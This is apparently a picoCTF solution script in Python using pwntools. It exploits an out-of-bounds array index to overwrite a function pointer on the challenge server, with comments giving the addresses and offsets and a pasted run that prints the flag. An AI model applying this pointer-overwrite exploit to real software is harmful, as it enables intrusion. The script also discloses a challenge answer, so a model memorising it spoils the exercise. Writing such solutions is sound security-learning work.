from pwn import *
import struct
import string
import binascii

conn = remote("saturn.picoctf.net", 52642)
conn.recvuntil(">> ")
conn.sendline("z" * 10 + "u")
conn.recvline()
conn.sendline("-16 -314")
response = conn.recvall()
conn.close()
print(response)

# hard_checker: 0x08049436
# easy_checker: 0x080492fc
# difference: -314

# check: 0x0804c040
# fun: 0x0804c080
# difference: 64, but since fun is an array of ints, the index we need is -16 (64 / 4)

# $ python3 solution.py
# [+] Opening connection to saturn.picoctf.net on port 52642: Done
# [+] Receiving all data: Done (69B)
# [*] Closed connection to saturn.picoctf.net port 52642
# b"You're 1337. Here's the flag.\npicoCTF{0v3rwrit1ng_P01nt3rs_529bfb38}\n"
